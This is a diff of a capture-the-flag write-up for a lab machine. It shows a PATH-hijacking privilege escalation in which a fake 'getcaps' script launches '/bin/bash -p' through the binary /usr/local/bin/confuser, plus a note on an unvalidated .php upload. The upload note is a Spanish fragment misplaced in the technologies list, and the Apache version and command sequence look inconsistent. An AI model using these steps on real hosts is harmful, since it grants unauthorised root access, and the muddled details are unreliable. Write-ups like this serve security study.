@@ -38,7 +38,7 @@ nmap -sC -sV --top-ports 1000 <IP>
 
 **Technologies:**
 
-* PHP / Apache 2.41.6 
+* PHP / Apache 2.41.6 enviando un archivo con extensión .php en el parámetro path, el cual no es validado por el servidor y termina determinando el nombre final del archivo.
 
 **Directories / Endpoints:**
 
@@ -103,8 +103,7 @@ export TERM=xterm
 
 * **Users:** root, ETSCTF
 * **Interesting Files:** /usr/local/bin/confuser
-* **Permissions:** -rwxr-xr-r
-
+* **Permissions:** -rwxr-xr-x
 ---
 
 ## Privilege Escalation
@@ -123,7 +122,7 @@ export TERM=xterm
 cd /tmp
 echo '/bin/bash -p' > getcaps
 chmod +x getcaps
-sudo PATH=/tmp:$PATH /usr/local/bin/confuser
+PATH=/tmp:$PATH /usr/local/bin/confuser
 sudo /usr/local/bin/confuser
 ```
 
